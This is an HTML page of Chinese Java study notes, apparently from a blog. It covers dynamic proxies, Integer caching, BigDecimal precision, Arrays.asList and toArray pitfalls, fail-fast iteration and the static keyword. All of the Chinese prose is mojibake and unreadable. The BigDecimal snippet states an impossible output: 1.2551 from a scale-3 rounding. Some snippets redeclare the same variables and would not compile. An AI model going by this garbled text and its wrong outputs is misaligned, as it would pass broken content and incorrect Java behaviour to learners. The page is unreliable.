<h3 id="JDKåŠ¨æ€ä»£ç†å’ŒCGLIBåŠ¨æ€ä»£ç†å¯¹æ¯”"><a href="#JDKåŠ¨æ€ä»£ç†å’ŒCGLIBåŠ¨æ€ä»£ç†å¯¹æ¯”" class="headerlink" title="JDKåŠ¨æ€ä»£ç†å’ŒCGLIBåŠ¨æ€ä»£ç†å¯¹æ¯”"></a>JDKåŠ¨æ€ä»£ç†å’ŒCGLIBåŠ¨æ€ä»£ç†å¯¹æ¯”</h3><ol>
<li><strong>JDK åŠ¨æ€ä»£ç†åªèƒ½åªèƒ½ä»£ç†å®ç°äº†æ¥å£çš„ç±»æˆ–è€…ç›´æ¥ä»£ç†æ¥å£ï¼Œè€Œ CGLIB å¯ä»¥ä»£ç†æœªå®ç°ä»»ä½•æ¥å£çš„ç±»ã€‚</strong> å¦å¤–ï¼Œ CGLIB åŠ¨æ€ä»£ç†æ˜¯é€šè¿‡ç”Ÿæˆä¸€ä¸ªè¢«ä»£ç†ç±»çš„å­ç±»æ¥æ‹¦æˆªè¢«ä»£ç†ç±»çš„æ–¹æ³•è°ƒç”¨ï¼Œå› æ­¤ä¸èƒ½ä»£ç†å£°æ˜ä¸º final ç±»å‹çš„ç±»å’Œæ–¹æ³•ã€‚</li>
<li>å°±äºŒè€…çš„æ•ˆç‡æ¥è¯´ï¼Œå¤§éƒ¨åˆ†æƒ…å†µéƒ½æ˜¯ JDK åŠ¨æ€ä»£ç†æ›´ä¼˜ç§€ï¼Œéšç€ JDK ç‰ˆæœ¬çš„å‡çº§ï¼Œè¿™ä¸ªä¼˜åŠ¿æ›´åŠ æ˜æ˜¾ã€‚</li>
</ol>
<h3 id="åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†çš„å¯¹æ¯”"><a href="#åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†çš„å¯¹æ¯”" class="headerlink" title="åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†çš„å¯¹æ¯”"></a>åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†çš„å¯¹æ¯”</h3><ol>
<li><strong>çµæ´»æ€§</strong> ï¼šåŠ¨æ€ä»£ç†æ›´åŠ çµæ´»ï¼Œä¸éœ€è¦å¿…é¡»å®ç°æ¥å£ï¼Œå¯ä»¥ç›´æ¥ä»£ç†å®ç°ç±»ï¼Œå¹¶ä¸”å¯ä»¥ä¸éœ€è¦é’ˆå¯¹æ¯ä¸ªç›®æ ‡ç±»éƒ½åˆ›å»ºä¸€ä¸ªä»£ç†ç±»ã€‚å¦å¤–ï¼Œé™æ€ä»£ç†ä¸­ï¼Œæ¥å£ä¸€æ—¦æ–°å¢åŠ æ–¹æ³•ï¼Œç›®æ ‡å¯¹è±¡å’Œä»£ç†å¯¹è±¡éƒ½è¦è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ˜¯éå¸¸éº»çƒ¦çš„ï¼</li>
<li><strong>JVM å±‚é¢</strong> ï¼šé™æ€ä»£ç†åœ¨ç¼–è¯‘æ—¶å°±å°†æ¥å£ã€å®ç°ç±»ã€ä»£ç†ç±»è¿™äº›éƒ½å˜æˆäº†ä¸€ä¸ªä¸ªå®é™…çš„ class æ–‡ä»¶ã€‚è€ŒåŠ¨æ€ä»£ç†æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆç±»å­—èŠ‚ç ï¼Œå¹¶åŠ è½½åˆ° JVM ä¸­çš„ã€‚</li>
</ol>
<h2 id="æ•´å‹åŒ…è£…ç±»å€¼çš„æ¯”è¾ƒ"><a href="#æ•´å‹åŒ…è£…ç±»å€¼çš„æ¯”è¾ƒ" class="headerlink" title="æ•´å‹åŒ…è£…ç±»å€¼çš„æ¯”è¾ƒ"></a>æ•´å‹åŒ…è£…ç±»å€¼çš„æ¯”è¾ƒ</h2><p>æ‰€æœ‰æ•´å‹åŒ…è£…ç±»å¯¹è±¡å€¼çš„æ¯”è¾ƒå¿…é¡»ä½¿ç”¨equalsæ–¹æ³•ã€‚</p>
<p>æ‰€æœ‰çš„ POJO ç±»å±æ€§å¿…é¡»ä½¿ç”¨åŒ…è£…æ•°æ®ç±»å‹ã€‚</p>
<p>RPC æ–¹æ³•çš„è¿”å›å€¼å’Œå‚æ•°å¿…é¡»ä½¿ç”¨åŒ…è£…æ•°æ®ç±»å‹ã€‚</p>
<p>æ‰€æœ‰çš„å±€éƒ¨å˜é‡ä½¿ç”¨åŸºæœ¬æ•°æ®ç±»å‹ã€‚</p>
<p>å…ˆçœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">System.out.println(x == y);<span class="comment">// true</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">3</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">3</span>);</span><br><span class="line">System.out.println(a == b);<span class="comment">//false</span></span><br><span class="line">System.out.println(a.equals(b));<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>å½“ä½¿ç”¨è‡ªåŠ¨è£…ç®±æ–¹å¼åˆ›å»ºä¸€ä¸ªIntegerå¯¹è±¡æ—¶ï¼Œå½“æ•°å€¼åœ¨-128 ~127æ—¶ï¼Œä¼šå°†åˆ›å»ºçš„ Integer å¯¹è±¡ç¼“å­˜èµ·æ¥ï¼Œå½“ä¸‹æ¬¡å†å‡ºç°è¯¥æ•°å€¼æ—¶ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­å–å‡ºå¯¹åº”çš„Integerå¯¹è±¡ã€‚æ‰€ä»¥ä¸Šè¿°ä»£ç ä¸­ï¼Œxå’Œyå¼•ç”¨çš„æ˜¯ç›¸åŒçš„Integerå¯¹è±¡ã€‚ </p>
<p><strong>æ³¨æ„ï¼š</strong> å¦‚æœä½ çš„IDE(IDEA&#x2F;Eclipse)ä¸Šå®‰è£…äº†é˜¿é‡Œå·´å·´çš„p3cæ’ä»¶ï¼Œè¿™ä¸ªæ’ä»¶å¦‚æœæ£€æµ‹åˆ°ä½ ç”¨ &#x3D;&#x3D;çš„è¯ä¼šæŠ¥é”™æç¤º</p>
<h2 id="BigDecimal"><a href="#BigDecimal" class="headerlink" title="BigDecimal"></a>BigDecimal</h2><p>æˆ‘ä»¬åœ¨ä½¿ç”¨BigDecimalæ—¶ï¼Œä¸ºäº†é˜²æ­¢ç²¾åº¦ä¸¢å¤±ï¼Œæ¨èä½¿ç”¨å®ƒçš„ <strong>BigDecimal(String)</strong> æ„é€ æ–¹æ³•æ¥åˆ›å»ºå¯¹è±¡ã€‚</p>
<p>BigDecimal ä¸»è¦ç”¨æ¥æ“ä½œï¼ˆå¤§ï¼‰æµ®ç‚¹æ•°ï¼ŒBigInteger ä¸»è¦ç”¨æ¥æ“ä½œå¤§æ•´æ•°ï¼ˆè¶…è¿‡ long ç±»å‹ï¼‰ã€‚</p>
<p>BigDecimal çš„å®ç°åˆ©ç”¨åˆ°äº† BigInteger, æ‰€ä¸åŒçš„æ˜¯ BigDecimal åŠ å…¥äº†å°æ•°ä½çš„æ¦‚å¿µ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1.0f</span> - <span class="number">0.9f</span>;</span><br><span class="line"><span class="type">float</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0.9f</span> - <span class="number">0.8f</span>;</span><br><span class="line">System.out.println(a);<span class="comment">// 0.100000024</span></span><br><span class="line">System.out.println(b);<span class="comment">// 0.099999964</span></span><br><span class="line">System.out.println(a == b);<span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.9&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.8&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">x</span> <span class="operator">=</span> a.subtract(b); </span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">y</span> <span class="operator">=</span> b.subtract(c); </span><br><span class="line">System.out.println(x); <span class="comment">/* 0.1 */</span></span><br><span class="line">System.out.println(y); <span class="comment">/* 0.1 */</span></span><br><span class="line">System.out.println(Objects.equals(x, y)); <span class="comment">/* true */</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.9&quot;</span>);</span><br><span class="line">System.out.println(a.compareTo(b));<span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.255433&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">n</span> <span class="operator">=</span> m.setScale(<span class="number">3</span>,BigDecimal.ROUND_HALF_DOWN);</span><br><span class="line">System.out.println(n);<span class="comment">// 1.2551</span></span><br></pre></td></tr></table></figure>

<h2 id="Arrays-asList"><a href="#Arrays-asList" class="headerlink" title="Arrays.asList()"></a>Arrays.asList()</h2><p>Arrays.asList()å°†æ•°ç»„è½¬æ¢ä¸ºé›†åˆå,åº•å±‚å…¶å®è¿˜æ˜¯æ•°ç»„</p>
<p>Arrays.asList()æ˜¯æ³›å‹æ–¹æ³•ï¼Œä¼ å…¥çš„å¯¹è±¡å¿…é¡»æ˜¯å¯¹è±¡æ•°ç»„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] myArray = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(myArray);</span><br><span class="line">System.out.println(myList.size());<span class="comment">//1</span></span><br><span class="line">System.out.println(myList.get(<span class="number">0</span>));<span class="comment">//æ•°ç»„åœ°å€å€¼</span></span><br><span class="line">System.out.println(myList.get(<span class="number">1</span>));<span class="comment">//æŠ¥é”™ï¼šArrayIndexOutOfBoundsException</span></span><br><span class="line"><span class="type">int</span>[] array = (<span class="type">int</span>[]) myList.get(<span class="number">0</span>);</span><br><span class="line">System.out.println(array[<span class="number">0</span>]);<span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>å½“ä¼ å…¥ä¸€ä¸ªåŸç”Ÿæ•°æ®ç±»å‹æ•°ç»„æ—¶ï¼Œ<code>Arrays.asList()</code> çš„çœŸæ­£å¾—åˆ°çš„å‚æ•°å°±ä¸æ˜¯æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œè€Œæ˜¯æ•°ç»„å¯¹è±¡æœ¬èº«ï¼æ­¤æ—¶List çš„å”¯ä¸€å…ƒç´ å°±æ˜¯è¿™ä¸ªæ•°ç»„ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸Šé¢çš„ä»£ç ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨åŒ…è£…ç±»å‹æ•°ç»„å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer[] myArray = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨é›†åˆçš„ä¿®æ”¹æ–¹æ³•:add()ã€remove()ã€clear()ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">myList.add(<span class="number">4</span>);<span class="comment">//è¿è¡Œæ—¶æŠ¥é”™ï¼šUnsupportedOperationException</span></span><br><span class="line">myList.remove(<span class="number">1</span>);<span class="comment">//è¿è¡Œæ—¶æŠ¥é”™ï¼šUnsupportedOperationException</span></span><br><span class="line">myList.clear();<span class="comment">//è¿è¡Œæ—¶æŠ¥é”™ï¼šUnsupportedOperationException</span></span><br></pre></td></tr></table></figure>

<p>Arrays.asList() æ–¹æ³•è¿”å›çš„å¹¶ä¸æ˜¯ java.util.ArrayList ï¼Œè€Œæ˜¯ java.util.Arrays çš„ä¸€ä¸ªå†…éƒ¨ç±»,è¿™ä¸ªå†…éƒ¨ç±»å¹¶æ²¡æœ‰å®ç°é›†åˆçš„ä¿®æ”¹æ–¹æ³•æˆ–è€…è¯´å¹¶æ²¡æœ‰é‡å†™è¿™äº›æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">System.out.println(myList.getClass());<span class="comment">//class java.util.Arrays$ArrayList</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹å›¾æ˜¯java.util.Arrays$ArrayListçš„ç®€æ˜“æºç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»é‡å†™çš„æ–¹æ³•æœ‰å“ªäº›ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ArrayList</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractList</span>&lt;E&gt;</span><br><span class="line">      <span class="keyword">implements</span> <span class="title class_">RandomAccess</span>, java.io.Serializable</span><br><span class="line">  &#123;</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">         ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; action)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">replaceAll</span><span class="params">(UnaryOperator&lt;E&gt; operator)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; c)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å†çœ‹ä¸€ä¸‹java.util.AbstractListçš„remove()æ–¹æ³•ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ˜ç™½ä¸ºå•¥ä¼šæŠ›å‡ºUnsupportedOperationExceptionã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¦‚ä½•æ­£ç¡®çš„å°†æ•°ç»„è½¬æ¢ä¸ºArrayList"><a href="#å¦‚ä½•æ­£ç¡®çš„å°†æ•°ç»„è½¬æ¢ä¸ºArrayList" class="headerlink" title="å¦‚ä½•æ­£ç¡®çš„å°†æ•°ç»„è½¬æ¢ä¸ºArrayList?"></a>å¦‚ä½•æ­£ç¡®çš„å°†æ•°ç»„è½¬æ¢ä¸ºArrayList?</h3><p><strong>1.è‡ªå·±åŠ¨æ‰‹å®ç°</strong></p>
<p><strong>2.æœ€ç®€ä¾¿çš„æ–¹æ³•(æ¨è)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>**3. ä½¿ç”¨ Java8 çš„Stream(æ¨è)**ç”¨è¿™ç§</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer [] myArray = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.stream(myArray).collect(Collectors.toList());</span><br><span class="line"><span class="comment">//åŸºæœ¬ç±»å‹ä¹Ÿå¯ä»¥å®ç°è½¬æ¢ï¼ˆä¾èµ–boxedçš„è£…ç®±æ“ä½œï¼‰</span></span><br><span class="line"><span class="type">int</span> [] myArray2 = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.stream(myArray2).boxed().collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<p><strong>4. ä½¿ç”¨ Guava(æ¨è)</strong></p>
<p>å¯¹äºä¸å¯å˜é›†åˆï¼Œä½ å¯ä»¥ä½¿ç”¨ImmutableListç±»åŠå…¶of()ä¸copyOf()å·¥å‚æ–¹æ³•ï¼šï¼ˆå‚æ•°ä¸èƒ½ä¸ºç©ºï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; il = ImmutableList.of(<span class="string">&quot;string&quot;</span>, <span class="string">&quot;elements&quot;</span>);  <span class="comment">// from varargs</span></span><br><span class="line">List&lt;String&gt; il = ImmutableList.copyOf(aStringArray);      <span class="comment">// from array</span></span><br></pre></td></tr></table></figure>

<p>å¯¹äºå¯å˜é›†åˆï¼Œä½ å¯ä»¥ä½¿ç”¨Listsç±»åŠå…¶newArrayList()å·¥å‚æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; l1 = Lists.newArrayList(anotherListOrCollection);    <span class="comment">// from collection</span></span><br><span class="line">List&lt;String&gt; l2 = Lists.newArrayList(aStringArray);               <span class="comment">// from array</span></span><br><span class="line">List&lt;String&gt; l3 = Lists.newArrayList(<span class="string">&quot;or&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="string">&quot;elements&quot;</span>); <span class="comment">// from varargs</span></span><br></pre></td></tr></table></figure>

<p><strong>5. ä½¿ç”¨ Apache Commons Collections</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">CollectionUtils.addAll(list, str);</span><br></pre></td></tr></table></figure>

<p><strong>6. ä½¿ç”¨ Java9 çš„ <code>List.of()</code>æ–¹æ³•</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">List&lt;Integer&gt; list = List.of(array);</span><br><span class="line">System.out.println(list); <span class="comment">/* [1, 2, 3] */</span></span><br><span class="line"><span class="comment">/* ä¸æ”¯æŒåŸºæœ¬æ•°æ®ç±»å‹ */</span></span><br></pre></td></tr></table></figure>



<h3 id="Collection-toArray-æ–¹æ³•ä½¿ç”¨çš„å‘-amp-å¦‚ä½•åè½¬æ•°ç»„"><a href="#Collection-toArray-æ–¹æ³•ä½¿ç”¨çš„å‘-amp-å¦‚ä½•åè½¬æ•°ç»„" class="headerlink" title="Collection.toArray()æ–¹æ³•ä½¿ç”¨çš„å‘&amp;å¦‚ä½•åè½¬æ•°ç»„"></a>Collection.toArray()æ–¹æ³•ä½¿ç”¨çš„å‘&amp;å¦‚ä½•åè½¬æ•°ç»„</h3><p>è¯¥æ–¹æ³•æ˜¯ä¸€ä¸ªæ³›å‹æ–¹æ³•ï¼š<code>&lt;T&gt; T[] toArray(T[] a);</code> å¦‚æœ<code>toArray</code>æ–¹æ³•ä¸­æ²¡æœ‰ä¼ é€’ä»»ä½•å‚æ•°çš„è¯è¿”å›çš„æ˜¯<code>Object</code>ç±»å‹æ•°ç»„ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] s= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">    <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;lazy&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;over&quot;</span>, <span class="string">&quot;jumps&quot;</span>, <span class="string">&quot;fox&quot;</span>, <span class="string">&quot;brown&quot;</span>, <span class="string">&quot;quick&quot;</span>, <span class="string">&quot;A&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">List&lt;String&gt; list = Arrays.asList(s);</span><br><span class="line">Collections.reverse(list);</span><br><span class="line">s=list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);<span class="comment">//æ²¡æœ‰æŒ‡å®šç±»å‹çš„è¯ä¼šæŠ¥é”™</span></span><br></pre></td></tr></table></figure>

<p>ç”±äºJVMä¼˜åŒ–ï¼Œ<code>new String[0]</code>ä½œä¸º<code>Collection.toArray()</code>æ–¹æ³•çš„å‚æ•°ç°åœ¨ä½¿ç”¨æ›´å¥½ï¼Œ<code>new String[0]</code>å°±æ˜¯èµ·ä¸€ä¸ªæ¨¡æ¿çš„ä½œç”¨ï¼ŒæŒ‡å®šäº†è¿”å›æ•°ç»„çš„ç±»å‹ï¼Œ0æ˜¯ä¸ºäº†èŠ‚çœç©ºé—´ï¼Œå› ä¸ºå®ƒåªæ˜¯ä¸ºäº†è¯´æ˜è¿”å›çš„ç±»å‹ã€‚è¯¦è§ï¼š<a href="https://shipilev.net/blog/2016/arrays-wisdom-ancients/">https://shipilev.net/blog/2016/arrays-wisdom-ancients/</a></p>
<h3 id="ä¸è¦åœ¨-foreach-å¾ªç¯é‡Œè¿›è¡Œå…ƒç´ çš„-remove-x2F-add-æ“ä½œ"><a href="#ä¸è¦åœ¨-foreach-å¾ªç¯é‡Œè¿›è¡Œå…ƒç´ çš„-remove-x2F-add-æ“ä½œ" class="headerlink" title="ä¸è¦åœ¨ foreach å¾ªç¯é‡Œè¿›è¡Œå…ƒç´ çš„ remove&#x2F;add æ“ä½œ"></a>ä¸è¦åœ¨ foreach å¾ªç¯é‡Œè¿›è¡Œå…ƒç´ çš„ remove&#x2F;add æ“ä½œ</h3><p>å¦‚æœè¦è¿›è¡Œremoveæ“ä½œï¼Œå¯ä»¥è°ƒç”¨è¿­ä»£å™¨çš„ removeæ–¹æ³•è€Œä¸æ˜¯é›†åˆç±»çš„ remove æ–¹æ³•ã€‚å› ä¸ºå¦‚æœåˆ—è¡¨åœ¨ä»»ä½•æ—¶é—´ä»ç»“æ„ä¸Šä¿®æ”¹åˆ›å»ºè¿­ä»£å™¨ä¹‹åï¼Œä»¥ä»»ä½•æ–¹å¼é™¤éé€šè¿‡è¿­ä»£å™¨è‡ªèº«remove&#x2F;addæ–¹æ³•ï¼Œè¿­ä»£å™¨éƒ½å°†æŠ›å‡ºä¸€ä¸ªConcurrentModificationException,è¿™å°±æ˜¯å•çº¿ç¨‹çŠ¶æ€ä¸‹äº§ç”Ÿçš„ fail-fast æœºåˆ¶ã€‚</p>
<blockquote>
<p>fail-fast æœºåˆ¶ ï¼šå¤šä¸ªçº¿ç¨‹å¯¹ fail-fast é›†åˆè¿›è¡Œä¿®æ”¹çš„æ—¶ï¼Œå¯èƒ½ä¼šæŠ›å‡ºConcurrentModificationExceptionï¼Œå•çº¿ç¨‹ä¸‹ä¹Ÿä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œä¸Šé¢å·²ç»æåˆ°è¿‡ã€‚</p>
</blockquote>
<p>Java8å¼€å§‹ï¼Œå¯ä»¥ä½¿ç”¨Collection#removeIf()æ–¹æ³•åˆ é™¤æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„å…ƒç´ ,å¦‚ </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    list.add(i);</span><br><span class="line">&#125;</span><br><span class="line">list.removeIf(filter -&gt; filter % <span class="number">2</span> == <span class="number">0</span>); <span class="comment">/* åˆ é™¤listä¸­çš„æ‰€æœ‰å¶æ•° */</span></span><br><span class="line">System.out.println(list); <span class="comment">/* [1, 3, 5, 7, 9] */</span></span><br></pre></td></tr></table></figure>

<p><code>java.util</code>åŒ…ä¸‹é¢çš„æ‰€æœ‰çš„é›†åˆç±»éƒ½æ˜¯fail-fastçš„ï¼Œè€Œ<code>java.util.concurrent</code>åŒ…ä¸‹é¢çš„æ‰€æœ‰çš„ç±»éƒ½æ˜¯fail-safeçš„ã€‚</p>
<h2 id="final-static-this-superå…³é”®å­—"><a href="#final-static-this-superå…³é”®å­—" class="headerlink" title="final,static,this,superå…³é”®å­—"></a>final,static,this,superå…³é”®å­—</h2><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><ol>
<li><strong>é™æ€å†…éƒ¨ç±»ï¼ˆstaticä¿®é¥°ç±»çš„è¯åªèƒ½ä¿®é¥°å†…éƒ¨ç±»ï¼‰ï¼š</strong> é™æ€å†…éƒ¨ç±»ä¸éé™æ€å†…éƒ¨ç±»ä¹‹é—´å­˜åœ¨ä¸€ä¸ªæœ€å¤§çš„åŒºåˆ«: éé™æ€å†…éƒ¨ç±»åœ¨ç¼–è¯‘å®Œæˆä¹‹åä¼šéšå«åœ°ä¿å­˜ç€ä¸€ä¸ªå¼•ç”¨ï¼Œè¯¥å¼•ç”¨æ˜¯æŒ‡å‘åˆ›å»ºå®ƒçš„å¤–å›´ç±»ï¼Œä½†æ˜¯é™æ€å†…éƒ¨ç±»å´æ²¡æœ‰ã€‚æ²¡æœ‰è¿™ä¸ªå¼•ç”¨å°±æ„å‘³ç€ï¼š1. å®ƒçš„åˆ›å»ºæ˜¯ä¸éœ€è¦ä¾èµ–å¤–å›´ç±»çš„åˆ›å»ºã€‚2. å®ƒä¸èƒ½ä½¿ç”¨ä»»ä½•å¤–å›´ç±»çš„éstaticæˆå‘˜å˜é‡å’Œæ–¹æ³•ã€‚</li>
<li><strong>é™æ€å¯¼åŒ…(ç”¨æ¥å¯¼å…¥ç±»ä¸­çš„é™æ€èµ„æºï¼Œ1.5ä¹‹åçš„æ–°ç‰¹æ€§):</strong> æ ¼å¼ä¸ºï¼š<code>import static</code> è¿™ä¸¤ä¸ªå…³é”®å­—è¿ç”¨å¯ä»¥æŒ‡å®šå¯¼å…¥æŸä¸ªç±»ä¸­çš„æŒ‡å®šé™æ€èµ„æºï¼Œå¹¶ä¸”ä¸éœ€è¦ä½¿ç”¨ç±»åè°ƒç”¨ç±»ä¸­é™æ€æˆå‘˜ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ç±»ä¸­é™æ€æˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•ã€‚</li>
</ol>
